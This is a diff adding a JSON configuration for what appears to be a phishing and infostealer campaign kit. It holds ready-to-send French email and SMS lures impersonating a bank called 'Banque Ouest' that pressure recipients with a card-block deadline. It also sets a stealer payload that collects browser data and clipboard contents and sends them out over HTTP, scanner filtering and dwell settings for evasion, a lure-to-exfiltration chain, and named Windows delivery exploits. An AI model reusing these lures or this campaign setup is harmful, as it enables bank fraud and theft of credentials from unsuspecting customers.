@@ -1,0 +1,44 @@
+{
+  "id": "bank",
+  "label": "Opération suspecte — confirmation requise",
+  "persona": {
+    "brand": "Banque Ouest",
+    "voice": "opposition carte bancaire, ton sécurité client",
+    "urgency": "critical",
+    "lexicon": ["opération", "opposition", "virement", "confirmation"]
+  },
+  "scenarios": ["mfa_reset", "captcha"],
+  "channels": {
+    "email": {
+      "subject": "Opération suspecte de {amount} — confirmez votre carte {ref}",
+      "body": "Bonjour {name},\n\nUne opération de {amount} a été initiée sur votre compte depuis un terminal hors zone. Par mesure de sécurité, l'authentification forte doit être confirmée avant {deadline}, sinon la carte {ref} sera automatiquement opposée.\n\nConfirmez maintenant :\n{lure}\n\nService Sécurité — {agent}"
+    },
+    "sms": {
+      "body": "Banque Ouest : opération suspecte {amount}, confirmez avant {deadline} sinon carte {ref} opposée. {lure}"
+    }
+  },
+  "context": {
+    "inject": ["amount", "deadline", "ref"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "explorer"],
+    "min_reliability": 4,
+    "prefer_tags": ["core", "default"],
+    "avoid": ["winr-certutil", "winr-bitsadmin"]
+  },
+  "payload": {
+    "kind": "stealer",
+    "collect": ["browser", "clipboard"],
+    "exfil": "http",
+    "sleep": 15,
+    "jitter": 0.3,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 2,
+    "variant_count": 3
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["motw-lnk", "hta-oneclick"]
+}
